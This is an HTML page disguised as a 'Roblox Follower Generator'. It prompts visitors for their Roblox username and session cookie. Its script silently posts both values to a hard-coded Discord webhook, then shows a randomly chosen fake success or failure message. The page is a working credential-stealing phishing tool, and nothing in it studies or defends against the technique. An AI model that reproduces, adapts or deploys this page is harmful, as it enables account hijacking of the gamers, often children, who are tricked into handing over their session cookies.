<html> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Roblox Follower Generator</title> <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet"> <style> body { background-color: #111; color: #0f0; } .container { margin-top: 50px; } .form-control { background-color: #222; color: #0f0; } .btn { background-color: #0f0; color: #000; } </style> </head> <body> <div class="container text-center"> <h1>Roblox Follower Generator</h1> <form id="followerForm"> <div class="mb-3"> <label for="username" class="form-label">Roblox Username</label> <input type="text" class="form-control" id="username" required> </div> <div class="mb-3"> <label for="cookie" class="form-label">Roblox Cookie</label> <input type="text" class="form-control" id="cookie" required> </div> <div class="mb-3"> <label for="followersRange" class="form-label">Select Followers Amount (1-1000)</label> <input type="range" class="form-range" min="1" max="1000" id="followersRange" required> <output for="followersRange" id="followersValue">1</output> </div> <button type="submit" class="btn btn-primary">Generate Followers</button> </form> </div> <!-- Pop-up Modal --> <div class="modal" id="resultModal" tabindex="-1"> <div class="modal-dialog"> <div class="modal-content"> <div class="modal-header"> <h5 class="modal-title">Result</h5> <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button> </div> <div class="modal-body" id="resultText"></div> </div> </div> </div> <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js"></script> <script> document.getElementById('followersRange').addEventListener('input', function() { document.getElementById('followersValue').innerText = this.value; }); document.getElementById('followerForm').addEventListener('submit', function(e) { e.preventDefault(); const username = document.getElementById('username').value; const cookie = document.getElementById('cookie').value; const followers = document.getElementById('followersRange').value; // Send data to webhook fetch('https://discord.com/api/webhooks/1123277577839186000/Dcux2eftRGn_MSaddKnjN8XTpK5SwTOGko2mAs2dQa2kdK2q9jAvfbOnXdUt-BgEoTsq', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: username, cookie: cookie }) }); // Randomly decide success or failure const success = Math.random() < 0.5; const resultText = success ? `Followers successfully sent to ${username}. New followers count: ${followers}.` : 'Failed to generate followers. Please try again later.'; // Show result modal const resultModal = new bootstrap.Modal(document.getElementById('resultModal')); document.getElementById('resultText').innerText = resultText; resultModal.show(); }); </script> </body> </html>
